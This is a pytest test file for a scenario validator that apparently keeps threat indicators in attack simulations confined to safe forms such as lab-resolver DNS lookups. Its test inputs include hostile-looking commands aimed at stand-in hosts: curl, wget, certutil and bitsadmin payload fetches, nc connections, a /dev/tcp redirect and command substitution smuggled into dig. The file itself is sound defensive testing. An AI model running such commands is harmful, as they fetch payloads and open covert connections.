from pathlib import Path

import pytest
import yaml

from engine.scenario_loader import (
    IndicatorSchema, ScenarioSchema, StepSchema, INDICATOR_TYPES, INDICATOR_SAFE_FORMS,
    unsafe_indicator_lines, _schema_to_orm_kwargs,
)

FIXTURE = Path(__file__).resolve().parent.parent / "fixtures" / "scenarios" / "sim-test-prev-001.yml"


def _ind(**kw):
    base = dict(id="ind-01", type="domain", value="rn-stage.example", safe_form="dns_lookup",
                source_url="https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/",
                surfaces_in=["step-01"])
    base.update(kw)
    return base


def _step(cmd, sid="step-01"):
    return dict(id=sid, name="n", identity="www-data", mitre_technique="T1071.001", command=cmd,
                expected_detections=[dict(plane="NDR", type="XQL", description="d")])


def _scenario(**overrides):
    data = yaml.safe_load(FIXTURE.read_text())
    data.update(overrides)
    return ScenarioSchema(**data)


def test_vocabularies_are_exact():
    assert INDICATOR_TYPES == frozenset({"sha256", "sha1", "md5", "domain", "url", "ipv4", "ipv6", "user_agent", "ja3", "ja4"})
    assert INDICATOR_SAFE_FORMS == frozenset({"log_field", "dns_lookup", "hash_only", "wildfire_test_file", "eicar"})


@pytest.mark.parametrize("bad", [
    dict(type="hash"), dict(type="sha256", value="abc"), dict(type="ipv4", value="10.1.2.3", safe_form="log_field"),
    dict(type="domain", value="evil[.]com"), dict(type="url", value="hxxp://evil.com/x", safe_form="log_field"),
    dict(type="domain", value="localhost"), dict(id="indicator-1"),
])
def test_s22_rejects_bad_type_or_malformed_value(bad):
    with pytest.raises(ValueError, match="S-22"):
        IndicatorSchema(**_ind(**bad))


def test_s23_source_url_must_be_unit42_or_panw_github():
    with pytest.raises(ValueError, match="S-23"):
        IndicatorSchema(**_ind(source_url="https://example.com/report"))
    IndicatorSchema(**_ind(source_url="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/x.txt"))


def test_s27_safe_form_must_fit_type():
    with pytest.raises(ValueError, match="S-27"):
        IndicatorSchema(**_ind(type="sha256", value="a" * 64, safe_form="dns_lookup"))
    with pytest.raises(ValueError, match="S-27"):
        IndicatorSchema(**_ind(type="domain", safe_form="hash_only"))
    IndicatorSchema(**_ind(type="sha256", value="a" * 64, safe_form="wildfire_test_file"))


def test_s24_surfaces_in_must_name_existing_steps():
    ind = IndicatorSchema(**_ind(surfaces_in=["step-09"]))
    with pytest.raises(ValueError, match="S-24"):
        _scenario(indicators=[ind.model_dump()], steps=[_step("dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}")])
    with pytest.raises(ValueError, match="S-24"):
        IndicatorSchema(**_ind(surfaces_in=[]))


@pytest.mark.parametrize("cmd", [
    "curl -s https://rn-stage.example/stage2 -o /tmp/s2",
    "dig +short rn-stage.example | xargs curl -s",
    "cat > /tmp/c.yml <<YML\nname: beacon to rn-stage.example\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n      dst_domain: other.example\nYML",
])
def test_s25_domain_outside_dns_lookup_or_params_is_rejected(cmd):
    assert any(l.startswith("S-25") for l in unsafe_indicator_lines(
        [IndicatorSchema(**_ind())], [StepSchema(**_step(cmd))]))


@pytest.mark.parametrize("cmd", [
    "dig +short rn-stage.example @${LAB_RESOLVER:-1.1.1.1}",
    "nslookup rn-stage.example $env:LAB_RESOLVER",
    "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n      dst_domain: rn-stage.example\n      dst_ip: 203.0.113.9\nYML",
])
def test_s25_allows_dns_lookup_lines_and_params_block(cmd):
    assert unsafe_indicator_lines([IndicatorSchema(**_ind())], [StepSchema(**_step(cmd))]) == []


def test_s25_ipv4_never_allowed_in_a_command_outside_params():
    ind = IndicatorSchema(**_ind(type="ipv4", value="203.0.113.9", safe_form="log_field"))
    assert any(l.startswith("S-25") for l in unsafe_indicator_lines([ind], [StepSchema(**_step("ping -c1 203.0.113.9"))]))


def test_s25_matches_whole_tokens_not_substrings():
    ind = IndicatorSchema(**_ind(value="rn-stage.example"))
    assert unsafe_indicator_lines([ind], [StepSchema(**_step("curl https://xrn-stage.example.org/"))]) == []


def test_s26_hash_on_a_fetch_line_is_rejected_but_sha256sum_is_fine():
    h = "b" * 64
    ind = IndicatorSchema(**_ind(type="sha256", value=h, safe_form="hash_only"))
    assert any(l.startswith("S-26") for l in unsafe_indicator_lines([ind], [StepSchema(**_step(f"curl -O https://x/{h}.bin"))]))
    assert any(l.startswith("S-26") for l in unsafe_indicator_lines([ind], [StepSchema(**_step(f"curl -O https://x/{h.upper()}.bin"))]))
    assert unsafe_indicator_lines([ind], [StepSchema(**_step(f"echo '{h}  /tmp/x' | sha256sum -c"))]) == []


def test_scenario_validator_raises_on_unsafe_surfacing():
    with pytest.raises(ValueError, match="S-25"):
        _scenario(indicators=[_ind()], steps=[_step("curl https://rn-stage.example/")])


def test_indicators_persist_and_default_empty():
    s = _scenario(indicators=[_ind()], steps=[_step("dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}")])
    assert _schema_to_orm_kwargs(s)["indicators"][0]["value"] == "rn-stage.example"
    assert _schema_to_orm_kwargs(_scenario(steps=[_step("id")]))["indicators"] == []


def test_orm_column_and_to_dict():
    from models import Scenario
    assert Scenario(indicators=[{"id": "ind-01"}]).to_dict()["indicators"] == [{"id": "ind-01"}]


def test_migration_adds_indicators_column():
    from sqlalchemy import create_engine, inspect, text
    from database import _migrate_scenarios_columns
    eng = create_engine("sqlite://")
    with eng.begin() as c:
        c.execute(text("CREATE TABLE scenarios (id INTEGER PRIMARY KEY)"))
        _migrate_scenarios_columns(c)
        cols = {col["name"] for col in inspect(c).get_columns("scenarios")}
    assert "indicators" in cols


# ── Fix round 1 ────────────────────────────────────────────────────────────
from engine.scenario_loader import CleanupSchema


def _s25(lines):
    return any(l.startswith("S-25") for l in lines)


def test_platform_variants_are_scanned():
    st = _step("id")
    st["platform_variants"] = {"windows": "iwr https://rn-stage.example/"}
    lines = unsafe_indicator_lines([IndicatorSchema(**_ind())], [StepSchema(**st)])
    assert _s25(lines) and any("platform_variants[windows]" in l for l in lines)


def test_cleanup_commands_are_scanned():
    ind = IndicatorSchema(**_ind())
    lines = unsafe_indicator_lines([ind], [StepSchema(**_step("id"))],
                                   CleanupSchema(commands=["curl https://rn-stage.example/x"]))
    assert _s25(lines) and any("cleanup" in l for l in lines)
    h = "c" * 64
    hind = IndicatorSchema(**_ind(type="sha256", value=h, safe_form="hash_only"))
    lines = unsafe_indicator_lines([hind], [StepSchema(**_step("id"))],
                                   CleanupSchema(commands=[f"wget https://x/{h}"]))
    assert any(l.startswith("S-26") and "cleanup" in l for l in lines)


def test_scenario_validator_scans_cleanup():
    with pytest.raises(ValueError, match="S-25"):
        _scenario(indicators=[_ind()], steps=[_step("dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}")],
                  cleanup={"commands": ["curl https://rn-stage.example/x"]})


def test_subdomains_fire_but_hyphen_prefixed_lookalikes_do_not():
    ind = [IndicatorSchema(**_ind())]
    assert _s25(unsafe_indicator_lines(ind, [StepSchema(**_step("curl https://www.rn-stage.example/"))]))
    assert unsafe_indicator_lines(ind, [StepSchema(**_step("curl https://x-rn-stage.example/"))]) == []


@pytest.mark.parametrize("cmd", [
    "dig +short rn-stage.example; nc rn-stage.example 443",
    "host rn-stage.example && ssh rn-stage.example",
    "dig +short rn-stage.example; ping rn-stage.example",
    "dig +short rn-stage.example || ping rn-stage.example",
    "dig +short rn-stage.example | nc rn-stage.example 443",
    "dig +short $(nc rn-stage.example 1) rn-stage.example",
    "dig +short `nc rn-stage.example 1` rn-stage.example",
])
def test_lookup_line_with_chaining_is_not_exempt(cmd):
    assert _s25(unsafe_indicator_lines([IndicatorSchema(**_ind())], [StepSchema(**_step(cmd))]))


def test_id_must_be_exactly_two_digits_and_unique():
    with pytest.raises(ValueError, match="S-22"):
        IndicatorSchema(**_ind(id="ind-001"))
    with pytest.raises(ValueError, match="S-22"):
        _scenario(indicators=[_ind(), _ind()], steps=[_step("dig +short rn-stage.example @${LAB_RESOLVER:-127.0.0.53}")])


def test_url_indicator_is_case_insensitive():
    ind = IndicatorSchema(**_ind(type="url", value="https://rn-stage.example/s2", safe_form="log_field"))
    assert _s25(unsafe_indicator_lines([ind], [StepSchema(**_step("curl HTTPS://RN-STAGE.EXAMPLE/s2"))]))


# ── Task 6b: fetch verb is a command token, not a hostname substring ─────────
@pytest.mark.parametrize("cmd,value", [
    ("dig +short npm-cache.example @${LAB_RESOLVER:-127.0.0.53}", "npm-cache.example"),
    ("dig +short curl.example @${LAB_RESOLVER:-127.0.0.53}", "curl.example"),
])
def test_fetch_verb_inside_hostname_does_not_block_lookup(cmd, value):
    ind = IndicatorSchema(**_ind(value=value))
    assert not _s25(unsafe_indicator_lines([ind], [StepSchema(**_step(cmd))]))


@pytest.mark.parametrize("cmd,fires", [
    ("npm install evil-pkg {h}", True),
    ("/usr/bin/curl -O https://x/{h}.bin", True),
    ("sudo wget https://x/{h}", True),
    ("pip3 download {h}", True),
    ("mycurl {h}", False),
    ("Invoke-WebRequest -Uri https://x/{h}", True),
    ("IWR -Uri https://x/{h}", True),
    ("Invoke-webrequest -Uri https://x/{h}", True),
    ("CURL -O https://x/{h}.bin", True),
    ("curl.exe -O https://x/{h}.bin", True),
    ("C:\\Windows\\System32\\curl.exe -O https://x/{h}", True),
    ("curl.example {h}", False),
    ("curl.exe.example {h}", False),
])
def test_fetch_verb_tokens_still_fire_s26(cmd, fires):
    h = "d" * 64
    ind = IndicatorSchema(**_ind(type="sha256", value=h, safe_form="hash_only"))
    lines = unsafe_indicator_lines([ind], [StepSchema(**_step(cmd.format(h=h)))])
    assert any(l.startswith("S-26") for l in lines) is fires


def test_lookup_piped_into_fetch_verb_still_fires_s25():
    ind = IndicatorSchema(**_ind())
    assert _s25(unsafe_indicator_lines([ind], [StepSchema(**_step("dig +short rn-stage.example | xargs curl -s"))]))


# ── Final review: tightened S-25 (I1 / I2 / M2 / M3 / M4) + in_band ──────────
_EVIL = dict(value="evil.example")
_IP4 = dict(type="ipv4", value="203.0.113.9", safe_form="log_field")
_RES = "@${LAB_RESOLVER:-127.0.0.53}"


def _lines(ind_kw, cmd):
    return unsafe_indicator_lines([IndicatorSchema(**_ind(**ind_kw))], [StepSchema(**_step(cmd))])


@pytest.mark.parametrize("ind_kw,cmd", [
    # I1a — redirection / background / process substitution are chaining
    (_EVIL, "dig evil.example >/dev/tcp/203.0.113.9/443"),
    (_EVIL, f"dig evil.example {_RES} >/dev/tcp/203.0.113.9/443"),
    (_EVIL, f"dig evil.example {_RES} > /tmp/out"),
    (_EVIL, f"dig evil.example {_RES} < /tmp/in"),
    (_EVIL, "dig evil.example & nc evil.example 443"),
    (_EVIL, f"dig evil.example {_RES} & nc evil.example 443"),
    (_EVIL, "dig evil.example <(nc 203.0.113.9 80)"),
    (_EVIL, f"dig evil.example {_RES} <(nc 203.0.113.9 80)"),
    (_EVIL, f"dig evil.example {_RES} >(nc 203.0.113.9 80)"),
    # I1b — only domain values are exempt on a lookup line
    (_IP4, "dig @203.0.113.9 evil.example"),
    (_IP4, f"dig -x 203.0.113.9 {_RES}"),
    # I1c — a lookup line must name a resolver
    (_EVIL, "dig +short evil.example"),
    (_EVIL, "nslookup evil.example"),
    (_EVIL, "getent hosts evil.example"),
    (_EVIL, "resolvectl query evil.example"),
    # the named resolver may not be the indicator itself
    (_EVIL, "dig +short evil.example @evil.example"),
    (_EVIL, "dig +short x.example @ns1.evil.example"),
])
def test_final_s25_lookup_exemption_tightened(ind_kw, cmd):
    assert _s25(_lines(ind_kw, cmd)), cmd


@pytest.mark.parametrize("cmd", [
    f"dig +short evil.example {_RES}",
    "nslookup evil.example $env:LAB_RESOLVER",
    "nslookup evil.example ${LAB_RESOLVER:-127.0.0.53}",
    "nslookup evil.example $LAB_RESOLVER",
    "drill evil.example @${LAB_RESOLVER:-127.0.0.53}",
    "host evil.example @${LAB_RESOLVER:-127.0.0.53}",
])
def test_final_s25_lookup_with_resolver_allowed(cmd):
    assert _lines(_EVIL, cmd) == []


def _campaign(plugin_lines, params):
    return "cat > /tmp/c.yml <<YML\nsteps:\n" + "".join(
        f"  - plugin: {p}\n    params:\n" + "".join(f"      {k}: {v}\n" for k, v in params.items())
        for p in plugin_lines) + "YML"


@pytest.mark.parametrize("ind_kw,cmd", [
    (_IP4, "bash <<'EOF'\nparams:\n  curl http://203.0.113.9/x\nEOF"),
    (_IP4, _campaign(["c2_http_beacon"], {"target_url": "http://203.0.113.9/"})),
    (_IP4, _campaign(["dns_tunnel_exfil"], {"dst_ip": "203.0.113.9"})),
    (_IP4, _campaign(["mystery_plugin"], {"dst_ip": "203.0.113.9"})),
    (_IP4, _campaign(["ngfw_eal_emitter", "c2_http_beacon"], {"dst_ip": "203.0.113.9"})),
    (_IP4, "cat > /tmp/c.yml <<YML\nparams:\n  dst_ip: 203.0.113.9\nYML"),  # no plugin
    (_IP4, "cat > /tmp/c.json <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
           "      dst_ip: 203.0.113.9\nYML"),  # not a .yml campaign file
    (_IP4, "tee /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
           "      dst_ip: 203.0.113.9\nYML"),
])
def test_final_s25_params_exemption_only_for_collector_campaign_files(ind_kw, cmd):
    assert _s25(_lines(ind_kw, cmd)), cmd


@pytest.mark.parametrize("plugin", sorted([
    "ngfw_eal_emitter", "ngfw_threat_emitter", "cloud_audit_emitter", "idp_signin_emulator",
    "email_emitter", "third_party_vpn_emitter"]))
def test_final_s25_params_exemption_allows_collector_streamers(plugin):
    assert _lines(_IP4, _campaign([plugin], {"dst_ip": "203.0.113.9"})) == []
    assert _lines(_IP4, _campaign([plugin], {"dst_ip": "203.0.113.9"}).replace(
        "cat > /tmp/c.yml <<YML", "cat > \"$WORK/campaign.yaml\" <<'YML'")) == []


def test_final_collector_post_plugins_exact():
    from engine.scenario_loader import COLLECTOR_POST_PLUGINS  # noqa: PLC0415
    assert COLLECTOR_POST_PLUGINS == frozenset({
        "ngfw_eal_emitter", "ngfw_threat_emitter", "cloud_audit_emitter",
        "cloud_storage_compute_emitter", "azure_audit_emitter", "k8s_audit_emitter",
        "m365_activity_emitter", "ad_windows_emitter", "idp_signin_emulator", "email_emitter",
        "duo_auth_emitter", "globalprotect_emitter", "third_party_alert_emitter",
        "third_party_firewall_emitter", "third_party_vpn_emitter"})


@pytest.mark.parametrize("ind_kw,cmd,fires", [
    # M2 — a here-string is not a heredoc
    (_IP4, "cat > /tmp/c.yml <<<EOF\nplugin: ngfw_eal_emitter\nparams:\n  curl http://203.0.113.9/x\nEOF", True),
    # M2 — '<<' inside a comment opens nothing
    (_IP4, "# cat > /tmp/c.yml <<EOF\nplugin: ngfw_eal_emitter\nparams:\n  curl http://203.0.113.9/x\nEOF", True),
    # M2 — '<<' inside arithmetic opens nothing (the lookup below stays exempt)
    (_EVIL, f"x=$(( FLAG << SHIFT ))\ndig +short evil.example {_RES}\nSHIFT", False),
    (_EVIL, f"x=$((1<<4))\ndig +short evil.example {_RES}", False),
])
def test_final_heredoc_detection_is_anchored(ind_kw, cmd, fires):
    assert _s25(_lines(ind_kw, cmd)) is fires


@pytest.mark.parametrize("cmd,fires", [
    ("curl http://evil.example/other", True),
    ("nc evil.example 443", True),
    (f"dig +short evil.example {_RES}", False),
])
def test_final_url_host_scanned_as_domain(cmd, fires):
    kw = dict(type="url", value="https://evil.example/stage2", safe_form="log_field")
    assert _s25(_lines(kw, cmd)) is fires


def test_final_url_ip_host_scanned_as_ipv4():
    kw = dict(type="url", value="http://203.0.113.9:8080/x", safe_form="log_field")
    assert _s25(_lines(kw, "nc 203.0.113.9 8080"))
    assert _s25(_lines(kw, f"dig -x 203.0.113.9 {_RES}"))


@pytest.mark.parametrize("cmd,fires", [
    ("certutil -urlcache -f https://x/{h} out.bin", True),
    ("certutil.exe -urlcache -split -f https://x/{h}", True),
    ("bitsadmin /transfer j https://x/{h} C:\\t\\x", True),
    ("Start-BitsTransfer -Source https://x/{h}", True),
    ("aria2c https://x/{h}", True),
    ("scp user@x:/srv/{h} .", True),
    ("tftp -g -r {h} x", True),
    ("ftp -n x {h}", True),
    ("ftp.example {h}", False),
    ("sftp-helper {h}", False),
])
def test_final_fetch_verbs_extended(cmd, fires):
    h = "e" * 64
    ind = IndicatorSchema(**_ind(type="sha256", value=h, safe_form="hash_only"))
    lines = unsafe_indicator_lines([ind], [StepSchema(**_step(cmd.format(h=h)))])
    assert any(l.startswith("S-26") for l in lines) is fires


def test_final_in_band_defaults_true_and_must_be_bool():
    assert IndicatorSchema(**_ind()).in_band is True
    assert IndicatorSchema(**_ind(in_band=False)).in_band is False
    for bad in ("no", 0, 1, None, "false"):
        with pytest.raises(ValueError, match="S-22"):
            IndicatorSchema(**_ind(in_band=bad))


# ── Final re-review R1 / I2 ───────────────────────────────────────────────────
@pytest.mark.parametrize("cmd", [
    "dig +short evil.example LAB_RESOLVER",
    "getent hosts evil.example LAB_RESOLVER",
    "getent hosts evil.example @${LAB_RESOLVER:-127.0.0.53}",
    "resolvectl query evil.example --LAB_RESOLVER",
    "resolvectl query evil.example @${LAB_RESOLVER:-127.0.0.53}",
    "host evil.example ${LAB_RESOLVER}",
    "nslookup evil.example LAB_RESOLVER",
    "nslookup evil.example 8.8.8.8 # $LAB_RESOLVER",
    "nslookup evil.example @${LAB_RESOLVER:-127.0.0.53}",
    "dig +short evil.example user@${LAB_RESOLVER}",
])
def test_rereview_r1_resolver_rule(cmd):
    assert _s25(_lines(_EVIL, cmd)), cmd


_REPORT_IP = "203.0.113.9"


def _mixed(spelling):
    return ("cat > /tmp/c.yml <<YML\nsteps:\n"
            "  - plugin: ngfw_eal_emitter\n    params:\n      dst_ip: 198.51.100.1\n"
            f"  - {spelling} c2_http_beacon\n    params:\n      target_url: http://{_REPORT_IP}/\nYML")


@pytest.mark.parametrize("cmd", [
    _mixed("plugin :"), _mixed('"plugin":'), _mixed("'plugin':"),
    # a body that fails to parse
    "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
    f"      dst_ip: {_REPORT_IP}\n   bad: [unclosed\nYML",
    # steps[] missing / a step without plugin
    f"cat > /tmp/c.yml <<YML\nplugin: ngfw_eal_emitter\nparams:\n  dst_ip: {_REPORT_IP}\nYML",
    "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
    f"      dst_ip: {_REPORT_IP}\n  - step_id: step-02\n    params:\n      x: 1\nYML",
    # a plugin key nested outside steps[] with a non-collector value
    "cat > /tmp/c.yml <<YML\nsteps:\n  - plugin: ngfw_eal_emitter\n    params:\n"
    f"      dst_ip: {_REPORT_IP}\n      plugin: ssh_egress\nYML",
])
def test_rereview_i2_params_exemption_fails_closed(cmd):
    assert _s25(_lines(_IP4, cmd)), cmd


def test_rereview_i2_collector_campaign_still_allowed():
    cmd = ("cat > /tmp/c.yml <<YML\ncampaign_id: CMP-X-001\nsteps:\n  - step_id: step-01\n"
           f"    plugin: ngfw_eal_emitter\n    params:\n      dst_ip: \"{_REPORT_IP}\"\nYML")
    assert _lines(_IP4, cmd) == []
    indented = "\n".join("      " + l if i else l for i, l in enumerate(cmd.split("\n")))
    assert _lines(_IP4, indented) == []
